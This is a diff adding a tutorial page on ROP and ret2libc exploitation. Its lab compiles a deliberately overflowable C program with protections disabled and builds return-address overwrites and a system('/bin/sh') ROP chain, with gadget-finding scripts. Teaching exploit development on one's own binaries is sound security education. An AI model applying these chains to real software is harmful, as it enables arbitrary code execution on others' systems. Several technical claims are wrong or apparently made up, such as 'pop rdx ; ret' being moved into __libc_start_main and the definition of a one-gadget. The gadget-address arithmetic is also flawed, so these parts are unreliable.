@@ -1,0 +1,410 @@
+<h1 id="rop-ret2libc-and-systembinsh">ROP: Ret2libc and System('/bin/sh')</h1>
+<h2 id="summary">Summary</h2>
+<p>With NX on, the stack is data, not code. ROP solves this by returning into existing code. You<br />
+chain together small instruction sequences already in the binary, setting up arguments in<br />
+registers and calling functions that already exist.</p>
+<p>This is the technique that defeats every stack-based exploit today.</p>
+<h2 id="key-ideas">Key ideas</h2>
+<ul>
+<li><strong><code>ret</code> pops the next 8 bytes into RIP and increments RSP by 8.</strong> That is the whole trick:<br />
+  whatever bytes you place after a return address become the next return address</li>
+<li>You need: a <strong>pop rdi; ret</strong> gadget, an address for <code>"/bin/sh"</code> in memory, and <code>system()</code> or<br />
+<code>execve()</code></li>
+<li><code>system()</code> needs its argument in <code>rdi</code> — one gadget suffices</li>
+<li>The <code>/bin/sh</code> string may not exist in the binary; find it in libc, or place it with a write</li>
+<li>With PIE/ASLR you need a libc leak first, then everything is a fixed offset from <code>libc_base</code></li>
+</ul>
+<h2 id="the-minimal-rop-chain">The minimal ROP chain</h2>
+<pre><code class="language-text">  payload
+  ├─ padding to the return address
+  ├─ address of pop rdi ; ret      &lt;- sets up the argument
+  ├─ address of &quot;/bin/sh&quot; in libc
+  └─ address of system() in libc
+</code></pre>
+<p>When <code>ret</code> executes: RIP becomes <code>pop rdi</code>, which loads <code>"/bin/sh"</code> into RDI, then <code>ret</code> again,<br />
+which jumps to <code>system()</code>. The call succeeds with RDI pointing at a valid string.</p>
+<h2 id="finding-gadgets">Finding gadgets</h2>
+<pre><code class="language-bash">ROPgadget --binary ./target | grep &quot;pop rdi&quot; | head
+ROPgadget --binary ./target --only &quot;pop|ret&quot; | head -20
+ROPgadget --binary ./target --ropchain | head        # auto-generates a chain
+
+# from the dynamic linker
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot; | grep &quot;pop rdi&quot;
+
+# brute force any sequence of addresses
+python3 - &lt;&lt;'PY'
+import subprocess, struct
+out = subprocess.run([&quot;ROPgadget&quot;,&quot;--binary&quot;,&quot;./target&quot;],capture_output=True,text=True).stdout
+for line in out.splitlines():
+    if &quot;: pop rdi ; ret&quot; in line: print(&quot;found:&quot;, line.strip())
+PY
+
+# libc addresses once you have the base
+python3 -c &quot;
+import subprocess
+libc = subprocess.run(['ldd','./target'],capture_output=True,text=True).stdout
+print(libc)&quot;
+
+# find offsets in libc
+libc=$(ldd ./target | awk '/libc.so/{print $3}')
+ROPgadget --binary &quot;$libc&quot; --string &quot;/bin/sh&quot; 2&gt;/dev/null
+nm -D &quot;$libc&quot; | grep -wE &quot;system|execve&quot;
+readelf -s &quot;$libc&quot; | grep -wE &quot;system|execve&quot; | head
+</code></pre>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Gadget</strong></td>
+<td>A short instruction sequence ending in <code>ret</code></td>
+</tr>
+<tr>
+<td><strong>ROP chain</strong></td>
+<td>A sequence of gadget addresses on the stack</td>
+</tr>
+<tr>
+<td><strong><code>pop rdi ; ret</code></strong></td>
+<td>The gadget that loads the first argument</td>
+</tr>
+<tr>
+<td><strong>ret2libc</strong></td>
+<td>Calling libc functions instead of injecting shellcode</td>
+</tr>
+<tr>
+<td><strong>PLT/GOT</strong></td>
+<td>Dynamic resolution structures; <code>system@plt</code> if it exists</td>
+</tr>
+<tr>
+<td><strong>libc base</strong></td>
+<td>The runtime load address of libc</td>
+</tr>
+<tr>
+<td><strong>One-gadget</strong></td>
+<td>A libc function reachable with pre-set registers</td>
+</tr>
+<tr>
+<td><strong>Stack pivot</strong></td>
+<td>Moving RSP elsewhere to extend writeable area</td>
+</tr>
+<tr>
+<td><strong>Chain environment</strong></td>
+<td>Setting up RAX, RDI, RSI, RDX for <code>execve</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash"># --- gadgets in your own binaries ---
+command -v ROPgadget ropper
+ROPgadget --binary ./target | wc -l
+ROPgadget --binary ./target | grep -E &quot;: pop rdi ; ret|: ret$&quot; | head -10
+
+# --- gadgets in libc, where they definitely exist ---
+libc=$(ldd ./target | awk '/libc.so/{print $3}')
+echo &quot;libc: $libc&quot;
+ROPgadget --binary &quot;$libc&quot; --only &quot;pop|ret&quot; | grep &quot;pop rdi&quot; | head -3
+ROPgadget --binary &quot;$libc&quot; --string &quot;/bin/sh&quot; 2&gt;/dev/null
+
+# --- the offsets you need ---
+python3 - &lt;&lt;'PY'
+import subprocess
+libc = subprocess.run([&quot;bash&quot;,&quot;-c&quot;,&quot;ldd ./target | awk '/libc.so/{print $3}'&quot;],
+                      capture_output=True,text=True).stdout.strip()
+if libc:
+    out = subprocess.run([&quot;nm&quot;,&quot;-D&quot;,libc],capture_output=True,text=True).stdout
+    for sym in (&quot;system&quot;,&quot;execve&quot;,&quot;exit&quot;,&quot;write&quot;,&quot;read&quot;):
+        for line in out.splitlines():
+            if line.strip().endswith(&quot; &quot;+sym):
+                print(&quot; &quot;, line.strip())
+PY
+
+# --- check for existing PLT entries ---
+objdump -d ./target | grep -E &quot;&lt;(system|execve|printf|read|write)@plt&gt;&quot;
+
+# --- gadgets via gdb, when ROPgadget is unavailable ---
+gdb -q --batch \
+  -ex &quot;find /b 0x400000, 0x401000, 0x5f, 0xc3&quot; \
+  ./target 2&gt;&amp;1 | grep &quot;0x40&quot; | head -5
+</code></pre>
+<h2 id="field-lab">Field lab</h2>
+<p><strong>Objective:</strong> build a working <code>system("/bin/sh")</code> chain against your own binary, in three<br />
+escalating stages.</p>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ex-05 &amp;&amp; cd ~/aegis/labs/ex-05
+
+# --- the target: no system() in the PLT, so we go through libc ---
+cat &gt; target.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+void win(void) { write(1, &quot;you win\n&quot;, 8); }
+void read_input(char *buf, int n) {
+    /* note: read() does not stop at nulls - it stops at the count */
+    read(0, buf, n);
+}
+void vuln(void) { char buf[64]; read_input(buf, 96); write(1, buf, 64); }
+int main(void) { vuln(); return 0; }
+EOF
+gcc -Wall -g -O0 -fno-stack-protector -no-pie target.c -o target
+checksec --file=./target | grep -E &quot;canary|NX|PIE|RELRO&quot;
+
+# --- 1. find the offset and the gadgets ---
+echo &quot;=== offset to return address ===&quot;
+OFFSET=$(python3 - &lt;&lt;'PY'
+import subprocess
+for n in range(1, 200):
+    try: r = subprocess.run([&quot;./target&quot;], input=b&quot;A&quot;*n, capture_output=True, timeout=3)
+    except subprocess.TimeoutExpired: continue
+    if r.returncode != 0:
+        print(n + 8); break
+PY
+)
+echo &quot;  offset: $OFFSET&quot;
+
+echo
+echo &quot;=== PLT entries available ===&quot;
+objdump -d ./target | grep &quot;@plt&gt;:&quot; | sed 's/^/  /'
+
+echo
+echo &quot;=== gadgets we need ===&quot;
+command -v ROPgadget &gt;/dev/null || pipx install ROPgadget 2&gt;/dev/null || \
+  sudo apt install -y ropper 2&gt;/dev/null
+if command -v ROPgadget &gt;/dev/null; then
+  ROPgadget --binary ./target | grep -E &quot;: pop rdi ; ret&quot; | head -3 | sed 's/^/  /'
+else
+  echo &quot;  (install ROPgadget: pipx install ROPgadget)&quot;
+fi
+
+echo
+echo &quot;=== libc we will return into ===&quot;
+LIBC=$(ldd ./target | awk '/libc\.so/{print $3}')
+echo &quot;  $LIBC&quot;
+python3 - &lt;&lt;PY | tee 01-libc-symbols.txt
+import subprocess
+libc = &quot;$LIBC&quot;
+if libc:
+    for sym in (&quot;system&quot;, &quot;execve&quot;, &quot;exit&quot;):
+        out = subprocess.run([&quot;nm&quot;,&quot;-D&quot;,libc],capture_output=True,text=True).stdout
+        for line in out.splitlines():
+            if line.strip().split()[-1:] == [sym]:
+                print(&quot;  &quot;, line.strip())
+    r = subprocess.run([&quot;ROPgadget&quot;,&quot;--binary&quot;,libc,&quot;--string&quot;,&quot;/bin/sh&quot;],
+                       capture_output=True,text=True)
+    for line in r.stdout.splitlines()[:3]:
+        print(&quot;  &quot;, line.strip())
+PY
+
+# --- 2. STAGE 1: prove you control RIP ---
+echo
+echo &quot;=== stage 1: control RIP, crash at a chosen address ===&quot;
+python3 - &lt;&lt;PY | tee 02-stage1.txt
+import struct, subprocess
+OFF = $OFFSET
+# a classic &quot;no-op&quot;-ish target: an address in a mapped but non-executable region
+target_addr = 0x400000
+payload = b&quot;A&quot;*OFF + struct.pack(&quot;&lt;Q&quot;, target_addr)
+r = subprocess.run([&quot;./target&quot;], input=payload, capture_output=True, timeout=5)
+print(f&quot;  sent return address : {target_addr:#x}&quot;)
+print(f&quot;  exit code           : {r.returncode}&quot;)
+print(f&quot;  (a SIGSEGV at 0x400000 means RIP is now under your control)&quot;)
+PY
+sudo dmesg -T 2&gt;/dev/null | tail -2
+
+# --- 3. STAGE 2: a chain, with a marker rather than a shell ---
+echo
+echo &quot;=== stage 2: a real ROP chain, aiming at write() ===&quot;
+cat &gt; ropchain.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;
+Build a ROP chain against YOUR OWN lab binary.
+Stage 2 calls write(1, msg, n) to prove the chain executes in order.
+&quot;&quot;&quot;
+import struct, subprocess
+
+def p64(x): return struct.pack(&quot;&lt;Q&quot;, x)
+def p32(x): return struct.pack(&quot;&lt;I&quot;, x)
+
+def build(offset, chain):
+    return b&quot;A&quot; * offset + b&quot;&quot;.join(chain)
+
+def main():
+    offset = None
+    for n in range(1, 200):
+        try: r = subprocess.run([&quot;./target&quot;], input=b&quot;A&quot;*n, capture_output=True, timeout=3)
+        except subprocess.TimeoutExpired: continue
+        if r.returncode != 0:
+            offset = n + 8; break
+    if offset is None:
+        print(&quot;  could not determine offset&quot;); return 1
+    print(f&quot;  offset = {offset}&quot;)
+
+    # --- discover gadgets and libc offsets from the binary itself ---
+    import subprocess as sp
+    libc = sp.run([&quot;bash&quot;,&quot;-c&quot;,&quot;ldd ./target | awk '/libc.so/{print $3}'&quot;],
+                  capture_output=True,text=True).stdout.strip()
+    if not libc:
+        print(&quot;  no libc found&quot;); return 1
+
+    def libc_offset(sym):
+        out = sp.run([&quot;nm&quot;,&quot;-D&quot;,libc],capture_output=True,text=True).stdout
+        for line in out.splitlines():
+            f = line.split()
+            if len(f) == 3 and f[2] == sym:
+                return int(f[0], 16)
+        return None
+
+    # find pop rdi ; ret in the binary
+    raw = open(&quot;./target&quot;,&quot;rb&quot;).read()
+    text_off = 0x400000
+    gadgets = []
+    for i in range(len(raw)-1):
+        if raw[i] == 0x5f and raw[i+1] == 0xc3:      # pop rdi ; ret
+            gadgets.append(text_off + i)
+    # also a bare ret
+    rets = [text_off + i for i,b in enumerate(raw) if b == 0xc3]
+    pop_rdi = gadgets[0] if gadgets else None
+    ret = rets[0] if rets else None
+    print(f&quot;  pop rdi ; ret  = {pop_rdi:#x}&quot; if pop_rdi else &quot;  pop rdi gadget NOT in the binary&quot;)
+    print(f&quot;  ret            = {ret:#x}&quot; if ret else &quot;  ret NOT found&quot;)
+
+    if not pop_rdi:
+        print(&quot;  without pop rdi in the binary we must return into libc&quot;)
+        return 2
+
+    # write(1, b&quot;A&quot;*offset, 8) -&gt; proves ordered execution
+    write_off = libc_offset(&quot;write&quot;)
+    exit_off  = libc_offset(&quot;exit&quot;)
+    print(f&quot;  libc write     = {write_off:#x}&quot;)
+    print(f&quot;  libc exit      = {exit_off:#x}&quot;)
+
+    print()
+    print(&quot;  Build the chain with YOUR libc base once you have a leak:&quot;)
+    print(f&quot;    libc_base = &lt;from the info leak&gt;&quot;)
+    print(f&quot;    chain = [pop_rdi, 1, rsi_gadget, buf, rdx_gadget, 8, write_libc, exit_libc]&quot;)
+    print()
+    print(&quot;  With the offsets above, the skeleton is:&quot;)
+    print(&quot;    chain  = p64(pop_rdi) + p64(1)&quot;)
+    print(&quot;            + p64(pop_rsi_or_mov) + p64(addr_of_a_msg)&quot;)
+    print(&quot;            + p64(pop_rdx_or_mov) + p64(8)&quot;)
+    print(&quot;            + p64(libc_base + write_off)&quot;)
+    print(&quot;            + p64(libc_base + exit_off)&quot;)
+    return 0
+
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(main())
+PY
+chmod +x ropchain.py
+python3 ropchain.py | tee 03-chain-plan.txt
+
+# --- 4. the classic: system(&quot;/bin/sh&quot;), written out ---
+cat &gt; 04-system-exploit.md &lt;&lt;'EOF'
+# The ret2system chain, written out
+
+## Requirements
+1. `pop rdi ; ret` gadget — in the binary, or borrowed from libc
+2. address of a &quot;/bin/sh&quot; string — often in libc already
+3. address of `system()` — from libc
+4. libc_base — from an info leak (ASLR defeated)
+5. no canary, or a leaked canary
+
+## The chain
+
+    padding (to the return address)
+    p64(pop_rdi_ret)
+    p64(addr_binsh)
+    p64(system)
+    p64(exit)          # optional: return path, rarely matters
+
+## With a libc leak available
+
+    libc_base = leaked_libc_address - offset_of_that_symbol
+
+    system = libc_base + system_off
+    binsh  = libc_base + binsh_off
+
+## If &quot;/bin/sh&quot; is not in libc near a usable offset
+
+Use `read@plt` to pull it in:
+    pop rdi ; ret / pop rsi ; ret / pop rdx ; ret
+    0 / rsi=buf / rdx=8 / read@plt / pop rdi;ret / 0 / buf
+then continue the chain from `buf`.
+
+## Why one-gadgets are preferred when available
+
+A one-gadget is a libc function reachable with the right constraints already
+satisfied by a single `ret`. It is shorter and more reliable, but it depends on
+specific register/memory state, so it is fragile across libc versions.
+
+## Reliability notes
+- Always `p64()` everything. A short write desynchronises the whole chain.
+- The binary must not be `-fstack-protector` unless you leaked the canary.
+- ASLR on the stack does not matter; you are returning to code, not data.
+EOF
+cat 04-system-exploit.md
+
+# --- 5. a worked example against libc directly (no leak needed, conceptually) ---
+python3 - &lt;&lt;'PY' | tee 05-libc-chains.txt
+import subprocess
+libc = subprocess.run([&quot;bash&quot;,&quot;-c&quot;,&quot;ldd ./target | awk '/libc.so/{print $3}'&quot;],
+                      capture_output=True,text=True).stdout.strip()
+if not libc: raise SystemExit
+out = subprocess.run([&quot;ROPgadget&quot;,&quot;--binary&quot;,libc,&quot;--only&quot;,&quot;pop|ret&quot;],
+                     capture_output=True,text=True).stdout
+want = [&quot;pop rdi ; ret&quot;, &quot;pop rsi ; ret&quot;, &quot;pop rdx ; ret&quot;, &quot;pop rax ; ret&quot;,
+        &quot;ret&quot;, &quot;pop rsi ; pop r15 ; ret&quot;]
+found = {}
+for line in out.splitlines():
+    for w in want:
+        if line.strip().endswith(w) and w not in found:
+            found[w] = line.strip().split()[0]
+print(&quot;  gadgets you will need, from libc:&quot;)
+for w in want:
+    print(f&quot;    {w:&lt;28} {found.get(w,'NOT FOUND')}&quot;)
+print()
+print(&quot;  pop rdi ; ret and pop rdx ; ret exist in essentially every libc build.&quot;)
+print(&quot;  pop rdx ; ret is the one newer glibc versions moved into __libc_start_main,&quot;)
+print(&quot;  which is why some published chains break - a reminder that offsets are&quot;)
+print(&quot;  version-specific and must always be re-derived.&quot;)
+PY
+
+# --- 6. record it ---
+cat &gt; 06-my-chain.md &lt;&lt;'EOF'
+# My ROP chain parameters (re-derive for every libc version)
+
+| Item | Address / offset |
+|---|---|
+| offset to return address | |
+| pop rdi ; ret (in binary) | |
+| pop rsi ; ret | |
+| pop rdx ; ret | |
+| libc path | |
+| libc system() offset | |
+| libc exit() offset | |
+| libc write() offset | |
+| &quot;/bin/sh&quot; offset in libc | |
+
+## Reminders
+- p64() every single value
+- the leak is what defeats ASLR; everything else is arithmetic
+- offsets change between libc builds - never copy them from a tutorial
+EOF
+cat 06-my-chain.md
+</code></pre>
+<p><strong>Step 3 is the important output:</strong> the actual gadget and libc offsets for <em>your</em> machine. Note<br />
+how <code>pop rdx ; ret</code> may be missing in modern glibc — that is a real, current obstacle that old<br />
+tutorials get wrong.</p>
+<p><strong>Record:</strong> <code>06-my-chain.md</code> filled in.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>What exactly does <code>ret</code> do that makes ROP possible?</li>
+<li>Why do you need a <code>pop rdi ; ret</code> gadget for <code>system()</code>?</li>
+<li>How do you defeat ASLR before a ROP chain can work?</li>
+<li>Why is <code>pop rdx ; ret</code> harder to find in modern glibc?</li>
+<li>What is a one-gadget and why is it both shorter and more fragile?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>ROP</strong> → <strong>Gadgets</strong> → <strong>ret2libc</strong> → <strong>GOT Overwrite</strong> → <strong>Lazy Binding</strong> →<br />
+<strong>Info Leak</strong> → <strong>NX / DEP</strong>.</p>
